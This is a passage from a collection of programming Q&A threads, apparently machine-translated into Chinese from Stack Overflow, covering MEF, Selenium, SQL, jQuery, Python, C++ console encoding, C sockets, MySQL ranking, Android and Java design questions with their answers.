foreach (TestRunnerBase t in testSteps)
{
    _container.SatisfyImportsOnce(t);
} 
```

但这对我来说有点不对劲，因为除了获取类型之外，导入的测试步骤的初始列表没有用于任何其他用途。所以我在想我应该将数据导出为 MEF 部件，然后独立导出处理程序，然后当我从 XML 中读取数据列表时，我会从列表中请求处理程序？如果这有意义吗？

我无法弄清楚如何以这种方式将它们联系在一起，因为 MEF 组合都在我`App.xaml.cs`的内部处理，并且测试步骤在其他地方的视图模型中。我正在考虑使用元数据将数据绑定到处理程序，然后在导入列表中找到相应的处理程序。也许我应该进行初始解析以构建字典以加快查找速度？

这是更应该这样做的方式吗？任何帮助表示赞赏，我在头发部门已经很轻了，所以我不能失去更多

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-18T01:35:07.843

Please correct me if I'm wrong - It seems as though you could achieve your goal by chaining imports: innermost being your `TestRunner` collection, then the hardware classes, then finally the content control.

In the example below these are `Class2 : MySubInterface`, `Class1 : MyInterface`, and `Program` respectively:

```
/////inner

using MyHostingNamespace;
namespace ClassLibrary1
{

    [Export("class2", typeof(MySubInterface))]
    class Class2 : MySubInterface
    {
        public string MyProperty { get; set; }

        public Class2()
        {

            MyProperty = "Class2";
        }
    }
} 

////middle

using MyHostingNamespace;
namespace ClassLibrary1
{

    [Export("class1", typeof(MyInterface))]
    public class Class1 : MyInterface
    {
        [Import("class2", AllowDefault=true)]
        MySubInterface myClass2;

        public string MyProperty {get;set;}

        public Class1()
        {

            AggregateCatalog catalog = new AggregateCatalog();
            catalog.Catalogs.Add(new AssemblyCatalog(Assembly.GetExecutingAssembly()));
            CompositionContainer _container = new CompositionContainer(catalog);
            _container.ComposeParts(this);

            MyProperty = myClass2.MyProperty;
        }
    }
}

////outer

namespace MyHostingNamespace
{
    class Program
    {
        [Import("class1")]
        public MyInterface class1;

        public Program()
        {
            AggregateCatalog catalog = new AggregateCatalog();
            catalog.Catalogs.Add(new AssemblyCatalog(Assembly.GetExecutingAssembly()));
            catalog.Catalogs.Add(new DirectoryCatalog("."));
            CompositionContainer _container = new CompositionContainer(catalog);

            _container.ComposeParts(this);

        }

        static void Main(string[] args)
        {

            Program p = new Program();

            Console.WriteLine(p.class1.MyProperty);

        }

    }

    public interface MyInterface
    {
        string MyProperty { get; set; }
    }

    public interface MySubInterface
    {
        string MyProperty { get; set; }
    }
} 
```

# node.js - Weinre JS API onload/ready 事件

> ID：14832081
> 
> 赞同：6
> 
> 时间：2013-02-12T11:59:57.157
> 
> 标签：node.js, weinre

`console`我正在使用 Weinre 调试 iPad 应用程序，并正在寻找来自 Weinre 的 JS 回调，它在 Weinre 完成加载时发出信号，例如在我的代码中使用它的对象是安全的。

我浏览了文档和将`target-script.js`Weinre 钩入我的页面的文档，但找不到任何东西。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-08T00:29:38.770

我认为通过“安全使用`console`”对象，您的意思是，写入对象何时`console`开始写入远程控制台窗口。如果是这样，那将是一个艰难的提议，因为您的应用程序可能永远不会连接到客户端调试器。或者客户端调试器可能会连接，然后断开连接，然后连接，......确实需要两个事件 -`weinreConnected`和`weinreDisconnected`，或类似的。

我不想向系统添加新事件，但如果有很多兴趣，我们可能会实现它。随时为新功能[打开 Jira 问题](https://issues.apache.org/jira/secure/CreateIssueDetails!init.jspa?pid=12312420&components=12316604&issuetype=2)。

# grails - 如何从 grails.converters.deep.XML 获取子节点

> ID：14832083
> 
> 赞同：0
> 
> 时间：2013-02-12T12:00:02.837
> 
> 标签：grails

我有一个 xml 类型 grails.converters.deep.XML

```
<?xml version="1.0" encoding="UTF-8"?>
<list>
  <customer>
    <name>A</name>
    <age>1</age>
  </customer>
  <customer>
    <name>B</name>
    <age>2</age>
  </customer>
  <customer>
    <name>C</name>
    <age>3</age>
  </customer>
</list> 
```

如何获得每个客户以及如何将其转换为客户域对象？

谢谢，

尼米

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:32:15.610

我认为深度转换器已被弃用。新方法应该是这样的：

XML.use('deep'){ ... }

[http://johnrellis.blogspot.co.uk/2009/11/grails-and-json-are-pretty-groovy.html](http://johnrellis.blogspot.co.uk/2009/11/grails-and-json-are-pretty-groovy.html)

但是你真的应该在 grails 2 中使用新的 render as json 功能

[http://grails.org/doc/latest/guide/theWebLayer.html#xmlAndJSON](http://grails.org/doc/latest/guide/theWebLayer.html#xmlAndJSON)

# java - 使用 selenium 捕获按钮的工具提示

> ID：14832085
> 
> 赞同：0
> 
> 时间：2013-02-12T12:00:07.517
> 
> 标签：java, html, selenium

我是硒初学者。不知道如何从以下 html 代码中捕获工具提示。这是html的结构：

```
<a id="aui_3_4_0_1_2236" title="Graceful shut down of the platform and power-off the hardware.">
    <span id="aui_3_4_0_1_2235" class="aui-button">
        <span id="aui_3_4_0_1_2234" class="aui-button-`enter code here`content">
            <input id="_PlatformSummaryPortlet_WAR_CPFSPGPortlet10SNAPSHOT_INSTANCE_AEDwGJz6R6iD_soft" class="aui-button-input" type="button" value="Soft Shutdown" onclick="javascript:soft()" style="display: inline;"/>
        </span>
    </span>
</a> 
```

并且标题具有工具提示值。我尝试了以下方法来获取工具提示：

```
WebElement Softshtdwn = driver.findElement(By.xpath(Object.SoftShutdownButton)); 
String tooltip = Softshtdwn.getAttribute("title");
String tooltip1 = Softshtdwn.getText(); 
String tooltip2 = Softshtdwn.getCssValue("title"); 
```

但由于某种原因，我得到了空值作为回报。任何帮助表示赞赏。注意：不能使用 by.ID，因为 ID 是动态的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T16:04:30.310

使用以下逻辑，您可以获得工具提示

但是，请确保您使用正确且唯一的定位器来获得确切所需的值。

```
String toolTip=driver.findElement(By.xpath("")).getAttribute("title"); 
```

如果您无法构建正确的 xpath，请在此处发布您的 html 代码。我会帮你的。

# sql - 单表中的父子 sql 查询

> ID：14832092
> 
> 赞同：2
> 
> 时间：2013-02-12T12:00:24.570
> 
> 标签：sql

我有一张桌子：

```
Id | Name |  ParentID 
```

我想`parentid`用父记录选择不等于零的记录（父记录有`parentid = 0`，但某些父记录没有子记录我想跳过它们）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:08:43.483

试试这个：

```
SELECT child.Id,
       child.Name,
       child.ParentId,
       parent.Name as ParentName
FROM your_table child
JOIN your_table parent ON child.ParentId = parent.id; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:06:47.860

检查这个：

```
select * from child c,parent p where c.ID=P.ParentID and c.ParentID !=0 
```

# javascript - 检查二维数组中是否存在大于数字的值

> ID：14832098
> 
> 赞同：1
> 
> 时间：2013-02-12T12:00:46.500
> 
> 标签：javascript, jquery

我有一个二维数组的格式

```
emi_309 | weak   | 16
emi_310 | strong | 9
emi_319 | medium | 8
emi_315 | weak   | 5 
```

我想使用如下所示的简单函数检查第三列中是否存在大于某个数字（例如> 5）的值：

```
 ($.inArray( conditions greater than 5 here, $.map(myArray, function(v) { return v[2]; })) > -1) 
```

如何在上述函数中包含条件 (>5)？

非常感谢你的帮助

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T12:05:01.067

[`$.grep`](http://api.jquery.com/jQuery.grep/)在这种情况下最好使用：

```
if ($.grep(myArray, function(v) { return v[2] > 5; }).length) {
    // values > 5 exist
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:21:10.927

`$.inArray`唯一针对特定值的测试（检查相等性）因此在这种情况下对您没有帮助。

您可以将 inArray 更改为能够处理谓词，因为它是第一个参数。像这样更改“基础库”应该小心完成，您可能想要创建一个不同的函数。然而，在这种特定情况下，我觉得传递函数的能力类似于其他 jQuery 函数

```
var org_inArray = $.inArray
$.inArray = function(value, array, fromIndex){
  if($.isFunction(value)){

      var start = fromIndex || 0,
          matches = $.grep(myArray.slice(start), function(e,i) { 
         if(value(e,i)) return i;
      }
      return matches ? matches[0] : -1; 
  } else {
     arguments.length > 2 ? 
             org_inArray.call($,value,array,fromIndex) :
             org_inArray.call($,value,array)
  }
} 
```

然后你就可以像使用它一样

```
if($.inArray( function(e) { return e[2] > 5;}, myArray) !== -1){
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:36:14.987

这样的事情很简单：

```
var firstMatch = function(arr, cond) {
    for (var i = 0, len = arr.length; i < len; i++) {
        if (cond(arr[i])) {return i;}
    } 
    return -1;
};

if (firstMatch(myArray, function(v) { return v[2] > 5; }) > -1) { ... } 
```

如果你真的想在 jQuery 命名空间中使用它，只需将它附加到 jQuery：

```
jQuery.firstMatch = function(Arr, cond) { ... 
```

并称它为

```
if ($.firstMatch(myArray, function(v) { return v[2] > 5; }) > -1) { ... } 
```

# ios - IOS 选项卡栏控制器：根据选项卡 A 中的操作重置选项卡 B

> ID：14832102
> 
> 赞同：0
> 
> 时间：2013-02-12T12:00:59.387
> 
> 标签：ios, uitabbarcontroller

我有兴趣从概念上了解如何根据“主选项卡”中的操作重置选项卡，该应用程序是一个写作应用程序，可以一次处理多个项目。

第一个选项卡将显示一个表格视图，显示当前可用的所有项目，当一个人选择一个项目时，我希望所有其他选项卡“重置”回到他们的主屏幕（有些会有导航，你可以向下钻取）

任何想法表示赞赏，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T16:23:56.567

从带有表格的控制器（在“主选项卡”中），您可以使用 self.tabBarController.viewControllers 访问所有选项卡栏控制器的视图控制器。您可以遍历该数组，并检查该对象是否是导航控制器——如果是，请调用 popToRootViewControllerAnimated: 以返回初始内容控制器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-07T12:25:52.510

要重置所有选项卡，我们可以编写以下代码

```
- (void)resetAllTabs{
for (id controller in self.tabBarController.viewControllers) {

    if ([controller isMemberOfClass:[UINavigationController class]]) {
        [controller popToRootViewControllerAnimated:NO];
    }
} 
```

# python - 如何以 pythonic 方式选择随机字符？

> ID：14832105
> 
> 赞同：4
> 
> 时间：2013-02-12T12:01:16.013
> 
> 标签：python, random

我想在 python 中生成一个 10 个字母数字字符的长字符串。所以这是从字母数字字符列表中选择随机索引的一部分。

**我的计划**：

```
set_list = ['a','b','c' ........] # all the way till I finish [a-zA-Z0-9]

index = random()    # will use python's random generator
some_char = setlist[index] 
```

有没有更好的随机选择角色的方法？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-12T12:02:30.323

通常的方式是 random.choice()

```
>>> import string
>>> import random
>>> random.choice(string.ascii_letters + string.digits)
'v' 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-12T12:06:05.200

试试这个：

```
def getCode(length = 10, char = string.ascii_uppercase +
                          string.digits +           
                          string.ascii_lowercase ):
    return ''.join(random.choice( char) for x in range(length)) 
```

跑：

```
>>> import random
>>> import string 
>>> getCode()
'1RZLCRBBm5'
>>> getCode(5, "mychars")
'ahssh' 
```

如果你有一个列表，那么你可以这样做：

```
>>> set_list = ['a','b','c','d']
>>> getCode(2, ''.join(set_list))
'da' 
```

如果要使用特殊符号，可以使用字符串的标点符号：

```
>>> print string.punctuation
!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-12T12:04:30.893

`random()`不是一个单独的函数。Python 3 中的传统方式是：

```
import random
import string

random.choice(string.ascii_letters + string.digits) 
```

`string.letters`取决于语言环境，并在 Python 3 中被删除。

# c++ - wcin 输入错误的字符？

> ID：14832109
> 
> 赞同：2
> 
> 时间：2013-02-12T12:01:29.110
> 
> 标签：c++, unicode, console-application

以下代码：

```
#include <iostream>

using std::wcin;
using std::wcout;
using std::locale;

int main()
{
    locale::global(locale("Portuguese_Brazil"));

    wcout << "wcin Test using \"ção\": "; // shows that wcout works properly
    wchar_t wcinTest[] = L"";
    wcin >> wcinTest;
    wcout << wcinTest << " should be \"ção\".";

    return 0;
} 
```

结果是：

```
wcin Test using "ção": ção
╬Æo should be "ção". 
```

╬ 字符是 U+2021 或 8225，ç 是 U+00E7 或 231。

我更改了多字节选项，在项目属性中设置和不设置 UNICODE。没有任何效果。

我已经将控制台字体设置为 Consolas，这是一种能够正确显示 ç 字符的真正类型字体。

我希望这可以作为未来 UNICODE 控制台应用程序的标准做法，尽可能简单且可重现。

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:14:28.023

`wcinTest`是`wchar_t`长度为 1 的缓冲区；

当你读入它时，你会溢出它。使用[`std::wstring`](http://en.cppreference.com/w/cpp/string/basic_string)欧洲工商管理学院。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T22:28:33.603

这终于奏效了：

```
#include <iostream>
#include <string>
#include <Windows.h>

using std::cin;
using std::cout;
using std::string;

int main()
{
    SetConsoleOutputCP(1252);
    SetConsoleCP(1252);

    cout << "wcin Test using \"ção\": "; // shows that wcout works properly
    string wcinTest;
    cin >> wcinTest;
    cout << wcinTest << " should be \"ção\".";

    return 0;
} 
```

我太新手了，不明白为什么我需要**SetConsoleOutputCP**和**SetConsoleCP**。我虽然可能只是 SetConsoleCP 可以解决所有问题，但不，我需要两者：**SetConsoleOutputCP** fixed ***cout***；和**SetConsoleCP**固定***cin***。

无论如何谢谢@StoryTeller

# python - 在 django 中获取最后插入的 id

> ID：14832115
> 
> 赞同：11
> 
> 时间：2013-02-12T12:01:58.883
> 
> 标签：python, django, rawsql

我正在从其他数据库迁移一些数据，所以我使用原始 sql 查询将数据插入数据库。但我不知道如何从 django 中的原始 sql 查询中获取最后插入的 id。我试过这个

```
affected_count1=cursor2.execute("table')")

and

SELECT IDENT_CURRENT(‘MyTable’) 
```

但它给了我**“（1305，'FUNCTION pydev.SCOPE_IDENTITY不存在'）”的错误**

所以请告诉我如何在 django 的原始 sql 查询中获取最后插入的 id

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-02-12T12:38:10.233

You can get latest create obj like this:

```
obj = Foo.objects.latest('id') 
```

more info [here](https://docs.djangoproject.com/en/dev/ref/models/querysets/#latest)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-12-14T21:57:15.300

在 Django 1.6 中

```
obj = Foo.objects.latest('id')

obj = Foo.objects.earliest('id') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-01-20T12:28:20.310

尝试这个

```
LastInsertId = (TableName.objects.last()).id 
```

# c - C - 第一次 recv() 调用后“传输端点未连接”

> ID：14832119
> 
> 赞同：6
> 
> 时间：2013-02-12T12:02:16.927
> 
> 标签：c, sockets, recv

我刚刚开始学习用 C 语言进行网络编程。我做了一些测试，但遇到了一个错误。

我有一个客户：

**客户端.c**

```
#include <string.h>
#include <netdb.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

int main(void)
{
    struct addrinfo hints, *res;
    int sock;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    getaddrinfo("localhost", "5996", &hints, &res);
    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    connect(sock, res->ai_addr, res->ai_addrlen);
    char data[64];
    int len = 13;
    int br = recv(sock, data, len, 0);
    printf("%s\n%s\n%d\n", strerror(errno), data, br);
    return 0;
} 
```

和服务器：

**服务器.c**

```
#include <string.h>
#include <netdb.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define MYPORT "5996"
#define BACKLOG 10

int main(void)
{
    struct sockaddr_storage their_addr;
    socklen_t addr_size;
    struct addrinfo hints, *res;
    int sockfd, new_fd;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    getaddrinfo(NULL, MYPORT, &hints, &res);

    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    bind(sockfd, res->ai_addr, res->ai_addrlen);
    listen(sockfd, BACKLOG);

    addr_size = sizeof their_addr;
    new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
    char *msg = "Hello World!!";
    int len = strlen(msg);
    int bs = send(new_fd, msg, len, 0);
    close(sockfd);
} 
```

当我启动服务器时，它等待连接，如果我启动客户端，我会收到消息“Hello World!!”，但是，一分钟左右，如果我尝试运行服务器然后运行客户端再次，我从**strerror()**调用中收到消息**“传输端点未连接” 。**

 **我确实阅读了有关此的其他问题，但问题是数据应该发送到从**accept()**调用返回的套接字......但我认为这就是我正在做的事情。我究竟做错了什么？？...我知道这很愚蠢，但我是一个真正的初学者。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-12T12:04:47.363

如果您每次都在同一个端口上重新启动服务器，您可能会发现该端口仍被操作系统视为正在使用。这是为了留出时间从上次服务器运行中为客户端传递任何正在进行的请求。

您可以通过调用`setsockopt`操作码来覆盖它`SO_REUSEADDR`

```
sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
int reuse = 1;
int err = setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
if (0 == err)
    err = bind(sockfd, res->ai_addr, res->ai_addrlen); 
```

请注意，上面的代码段检查错误返回。如果您检查了每个调用的返回码，您就会在这里自己发现问题（如果不是解决方案）。**

# php - Mysql添加简单排名表

> ID：14832126
> 
> 赞同：1
> 
> 时间：2013-02-12T12:02:30.487
> 
> 标签：php, mysql, database, rank

嗨，我想简单地添加 1、2、3、4、5、6、7、8、9、10 等级。

我的输出现在给出以下内容：

```
USER ID | SCORE
2       | 10242
13231   | 3427
23732   | 3378
24638   | 2934
23468   | 1898 
```

我试图实现的是：

```
RANK | USER ID | SCORE
#1   | 2       | 10242
#2   | 13231   | 3427
#3   | 23732   | 3378
#4   | 24638   | 2934
#5   | 23468   | 1898 
```

这是我的 php：

```
<?php $result = mysql_query("SELECT * FROM `users_score` ORDER BY `users_score`.`score` DESC LIMIT 0 , 10") or die(mysql_error());
if(mysql_num_rows($result) > 0): ?>
<table>
    <tr>
        <th style="text-align:left;">ID</th>
        <th style="text-align:left;">SCORE</th>
    <tr>
    <?php while($row = mysql_fetch_assoc($result)): ?>
    <tr>
        <td><?php echo $row['user_id']; ?></td>
        <td style="font-weight: bold; color: #008AFF;"><?php echo $row['score']; ?></td>
    </tr>
    <?php endwhile; ?>
</table>
<?php endif; ?> 
```

是否有一个简单的类似计数功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:04:01.370

您可以使用变量在查询中执行此操作。

```
SELECT  @row:=@row+1 as RankNo,
        a.UserID,
        a.Score
FROM    tableName a, (SELECT @row:=0) b
ORDER   BY a.Score DESC 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/da567/1)

*但它有一个缺点，它不处理平局分数*

如果要添加`#`排名，请连接`RankNo with`#`

**更新 1**

```
SELECT  CONCAT('#', @row:=@row+1) as RankNo,
        a.UserID,
        a.Score
FROM    tableName a, (SELECT @row:=0) b
ORDER   BY a.Score DESC 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/da567/3)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:04:37.920

```
SELECT (@rank := @rank + 1) AS rank, user_id, score
FROM (  SELECT user_id, score
        FROM scores, (SELECT @rank := 0) AS vars
        ORDER BY score DESC) AS h 
```

[**SQLFiddle**](http://www.sqlfiddle.com/#!2/1b724/3)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:17:39.687

您正在寻找的是等同于 MS SQL 的 row_number() 函数。之前已经回答过这个问题，例如[这里](https://stackoverflow.com/questions/3126972/mysql-row-number)或[这里](http://stackovereflow.com/questions/2520357/mysql-get-row-number-on-select)

答案是使用类似的东西：

```
SELECT @rn:=@rn+1 as RANK, ID, SCORE
       FROM `users_score`, (SELECT @rn:=0) as rn
       ORDER BY `users_score`.`score` DESC LIMIT 0 
```

**更新**

只是出于兴趣，可以在 SQL 中处理匹配分数：

```
SELECT  @rn := @rn + case (@ls-SCORE) when 0 then 0 else @s end as RANK,
        ID,
        SCORE,
        @s := case (@ls-SCORE) when 0 then @s+1 else 1 end as STEPSIZE,
        @ls := SCORE as LASTSCORE
FROM    `users_score`.`score` a,
        (SELECT @rn := 0) b,
        (SELECT @ls := max(SCORE)+1 FROM `users_score`.`score`) c,
        (SELECT @s := 1) d
ORDER   BY a.Score DESC LIMIT 0 
```

但是，如果您想这样做，那么在 PHP 代码中会更容易。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:25:45.497

```
If you just want changes in your php here is the code...

<?php 
$result = mysql_query("SELECT * FROM `users_score` ORDER BY `users_score`.`score` DESC LIMIT 0 ,10")  or die(mysql_error());

$rank=0;
$temp_score=0;

if(mysql_num_rows($result) > 0): ?>
<table>
    <tr>
        <th style="text-align:left;">RANK</th>
        <th style="text-align:left;">ID</th>
        <th style="text-align:left;">SCORE</th>
    <tr>
    <?php while($row = mysql_fetch_assoc($result)): 
         if($temp_score!=$row['score'])
             $rank++;
    ?>
    <tr>
     <td><?php echo "#".$rank; ?></td>
     <td><?php echo $row['user_id']; ?></td>
     <td style="font-weight: bold; color: #008AFF;"><?php echo $row['score']; ?></td>
    </tr>
    <?php 
         $temp_score=$row['score];
      endwhile; ?>
</table>
<?php endif; ?> 
```

# android - android在显示两个片段时显示actionbar

> ID：14832131
> 
> 赞同：1
> 
> 时间：2013-02-12T12:02:43.050
> 
> 标签：android, android-fragments, fragment

安卓专家，

请在这个问题上帮助我。我为 android 平板电脑创建了两个并排对齐的片段。当用户点击`ListView`左侧时，相关活动会加载到右侧。现在的问题是，我想`action bar`在我的每个活动屏幕中显示，但在这个屏幕`ActionBar`上看不到。当我正在加载片段时`list item click`，我的 xml 是这种格式的

`<LinearLayout>`
`<FrameLayout/>`--左片段 --右
`<FrameLayout/>`片段
`</LinearLayout>`

现在，如果我把`ActionBar`代码像

`<include android:layout="@layout/actionbar">`
`<LinearLayout>`
`<FrameLayout/>`--左片段 --右
`<FrameLayout/>`片段
`</LinearLayout>`

这没有显示`ActionBar`在顶部。请帮我。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-23T12:52:09.420

我通过使用`FragmentActivity`. 代码如下，

```
FragmentManager fm = getFragmentManager();
FragmentTransaction ft = fm.beginTransaction();
ft.replace(FragmentA.this.getParent().getID(), mNewFragment);
ft.addToBackStack(null);
ft.commit(); 
```

# jpa - Eclipse：动态 Web 项目中的 JPA

> ID：14832132
> 
> 赞同：1
> 
> 时间：2013-02-12T12:02:51.197
> 
> 标签：jpa, import, jar

在 Eclipse 中，我使用我的实体和存储库创建了一个 JPA 项目。

现在我想用我的 servlet 和 jsp 创建一个动态 web 项目。

我如何让两者相互合作？

我会说从我的 JPA 项目中制作一个 jar 并将其导入到我将其加载到构建路径的动态 Web 项目中。

我试过这个，但我得到一个“导入......无法解决”错误

我需要放置这个罐子的特定位置吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T08:25:05.393

我通过在 WebContent/WEB-INF/lib 文件夹中添加 jar 来实现这一点。您不需要添加到构建路径，只需将您的 jar 放在这里，您的 IDE 将在需要时使用它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T10:22:49.970

不要将其添加为 jar ，将构建路径添加为**参考项目**

# c# - autogeneratecolumn=true 时如何实现 wrap 属性？

> ID：14832136
> 
> 赞同：1
> 
> 时间：2013-02-12T12:03:09.700
> 
> 标签：c#, asp.net, css, gridview

我正在使用网格视图，并且我需要每当任何列包含比其宽度长的文本时，它都应该换行，或者它应该在新行中显示文本的另一部分。下面是网格视图代码：

```
 <asp:GridView ID="GridView1"  AllowSorting="True" runat="server" 
        onsorting="GridView1_Sorting" AllowPaging="True" PageSize="6" CellPadding="4" 
        onpageindexchanging="GridView1_PageIndexChanging" 
        onrowdatabound="GridView1_RowDataBound" ForeColor="#333333" 
        GridLines="Vertical">
        <AlternatingRowStyle BackColor="White" ForeColor="#284775" />
        <EditRowStyle BackColor="#999999" />
        <FooterStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
        <HeaderStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
        <PagerStyle Wrap="false" BackColor="#284775" ForeColor="White" HorizontalAlign="Center" />
        <RowStyle Wrap="false" BackColor="#F7F6F3" ForeColor="#333333" />
        <SelectedRowStyle BackColor="#E2DED6" Font-Bold="True" ForeColor="#333333" />
        <SortedAscendingCellStyle BackColor="#E9E7E2" />
        <SortedAscendingHeaderStyle BackColor="#506C8C" />
        <SortedDescendingCellStyle BackColor="#FFFDF8" />
        <SortedDescendingHeaderStyle BackColor="#6F8DAE" />
    </asp:GridView> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:09:55.090

而不是像`ItemStyle`您一样为 gridview 使用不同的设置，而应该编写一个单独的`css class for it`.
这是一个很好的链接
[Asp.net Css Gridview Styling](https://stackoverflow.com/questions/12308521/asp-net-css-gridview-styling)
[Fixed Column Headers For ASP.NET Gridview](https://stackoverflow.com/questions/13055193/fixed-column-headers-for-asp-net-gridview)

## 例子

```
 <%@ Page Language=" C#" %>

    <head runat="server">
        <title>Untitled Page</title>
        <style type="text/css">
            .headerStyle
            {
                background-color: #FF6600;
                color: #FFFFFF;
                font-size: 8pt;
                font-weight: bold;
            }

            .itemStyle
            {
                background-color: #FFFFEE;
                color: #000000;
                font-size: 8pt;
            }

            .alternateItemStyle
            {
                background-color: #FFFFFF;
                color: #000000;
                font-size: 8pt;
            }
        </style>
    </head>
    <body>
        <form id="form1" runat="server">
        <div>
            <asp:GridView ID="ItemsGridView" AutoGenerateColumns="false"
                DataKeyNames="ItemID" runat="server">
                <Columns>
                    <asp:BoundField DataField="ItemID" HeaderText="Item ID" ReadOnly="true" ItemStyle-Width="100px"
                        ItemStyle-CssClass="itemStyle" />
                    <asp:BoundField DataField="ItemName" HeaderText="Item Name" ReadOnly="true" ItemStyle-Width="100px" />
                    <asp:BoundField DataField="ClStk" HeaderText="Item closingStock" ReadOnly="true"
                        ItemStyle-Width="100px" />
                </Columns>
                <AlternatingRowStyle CssClass="alternateItemStyle" />
                <HeaderStyle CssClass="headerStyle" />
            </asp:GridView>

        </div>
        </form>
    </body> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:04:35.220

您可以像这样将 TemplateField 的 ItemStyle 设置为 true：

```
<ItemStyle Wrap="true" Width="100px" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:09:53.270

由于您是自动生成列，因此您需要使用 RowDataBound 事件来检查每一行的每一列的长度。
这是它的文档[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.rowdatabound.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.rowdatabound.aspx)

# java - 多个对象数组

> ID：14832137
> 
> 赞同：2
> 
> 时间：2013-02-12T12:03:13.843
> 
> 标签：java, arrays, object, methods, arraylist

我目前正在制作一个简单的网上商店应用程序。网店需要将三种物品添加到购物车中。一张CD、一本书或一个游戏。我为每个都有`toString()`方法的对象创建了一个类。

现在我必须创建一个方法，该方法`add(..)`需要将指定的对象添加到名为 shoppingcart 的 ArrayList 中。此方法需要在 Webshop 类中调用，该类本身具有已创建的对象。

我知道如何使用多种添加方法来做到这一点，但需要使用一种方法来做到这一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:06:03.877

您可能想要创建一个名为 like 的新类型`AbstractItem`，并且您的所有其他类型都从该类型扩展而来。将这个抽象类隐藏在接口后面也是一个好习惯。因此，`AbstraxtItem`该类可以实现定义公共 API 的 Item 接口。

该类`AbstractItem`将定义其子类型应实现的一些抽象方法，`getPrice()`以及可能是所有子类的共同行为的其他具体方法。购物车将是一个`ArrayList<Item>`并且将由该`add(Item)`方法填充。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T12:06:48.803

您商店中可以添加的每个对象都应该实现一个`interface IProduct.` 您然后有一个 IProduct 列表，您可以添加该列表。

```
ArrayList<IProduct> shoppingBasket = new ArrayList<IProduct>(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:35:41.037

**OOP** can help you solve this problem :

1.  If you find `CD, Book or Game` has some common **attribute** then you can use a Base class with common features and let all these **extend** that class.

    So `CD, Book and Game` extends a class say **Product** and you provide a generic add method which takes `Product` as parameter.

    **add(Product product);**

2.  If `CD, Book and Game` **don't** share any common features then also you can use OOPs feature to add all these in more simpler way; but here you need to use method **overloading**

    **add(CD cd);**

    **add(Book book);**

So will suggest, think over your application design and then take a call on either of the approaches.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-12T12:08:11.983

您可以让 CD、Book 和 Game 类实现一个[接口](http://docs.oracle.com/javase/tutorial/java/concepts/interface.html)，例如`ShopObject`. 然后你可以像这样拥有你的shoppinCart：

```
ArrayList<ShopObject> shoppingCart = new ArrayList<ShopObject>(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:07:10.093

您可以使用判别式聚合所有对象来指示哪个对象真正被表示，就像 Ada 中的变体记录或 C 中的联合一样。

你在这里有一个完整的例子：http: [//lambda-the-ultimate.org/node/2694#comment-40453](http://lambda-the-ultimate.org/node/2694#comment-40453)

# ruby-on-rails - 如何编辑对象数组的单个字段？

> ID：14832138
> 
> 赞同：0
> 
> 时间：2013-02-12T12:03:14.927
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2

我正在尝试编辑一组用户。我想用名称和复选框列表呈现表格。我很接近，但我错过了一些东西。

